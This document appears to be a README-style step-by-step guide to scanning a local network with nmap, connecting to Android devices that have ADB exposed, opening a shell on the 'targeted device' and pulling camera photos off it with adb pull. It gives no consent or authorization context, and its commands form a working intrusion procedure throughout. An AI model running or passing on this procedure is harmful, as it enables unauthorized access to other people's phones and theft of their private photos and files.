# Access any media form the devices that is connected within your network

## Step 1
 * Install Nmap into your system 👉 [Nmap](https://nmap.org/)
 * Check that Nmap is installed in your system by running the command in powershell
 ```bash
 nmap --version

```
 ## Step 2
 * Search the devices that is connected in that network by running this command
 ```bash
  nmap -sn 192.168.1.0/24
  ```
 * You will see the list of devices with the mac and ip address along with the manufacturer company name

 ## Step 3 
 * Now this step is important 
 ```bash
 nmap -p- 192.168.1.0/24
 ```
 * The above command is a bit time taking process cause it is going to list all the open port of that devices which is connected to that network i'm not recomend you to do this *instead* Target the divece by their ip address to see the open port of that device so to do that run this command
 ```bash
 nmap -p- <device-ip-address>
 ```
 ## Step 4
 * Once you get the open port number of that device along with ip Now it's time to connect with it by this command
 ```bash
adb connect <ip-address>:<port>
```
* ✔ Congratulations if connected now it's time to swim in the targeted device by this command
```bash
adb shell
```
* Run this command to change the current directory 
```bash
cd /storage/emulated/0/
```
* Now list the folders by `ls` command
* It's time to get some file from the targeted device to do that first exit from the current directory by `exit` command after that change the directory where you want to store that data by `cd` command now it's time to pull the deta so to do that run this command, now this is just for the example but it's work as your

```bash
adb pull /storage/emulated/0/DCIM/Camera/IMG_20241229_212817.jpg
```
* To see the file which you have retrive check the directory in the file manager where you have run the above command
* 🎉 Success!
## Summary  

This guide provides a step-by-step process to access and retrieve media files from devices connected to your local network. Below is an outline of the steps:  

1. **Install Nmap**  
   - Install Nmap and verify the installation by running `nmap --version`.  

2. **Scan Network**  
   - Scan your network to identify connected devices with `nmap -sn 192.168.1.0/24`.  
   - Find open ports on a specific device using `nmap -p- <device-ip-address>`.  

3. **Connect via ADB**  
   - Use the `adb connect <ip>:<port>` command to connect your system to the target device.  

4. **Explore Device Storage**  
   - Access the device's file system using `adb shell`.  
   - Navigate through the storage using basic shell commands like `cd` and `ls`.  

5. **Retrieve Files**  
   - Download files from the device to your system using the `adb pull <device-file-path>` command.  

By following these steps, you can seamlessly connect to devices on your network, browse their storage, and retrieve desired files for further use.  
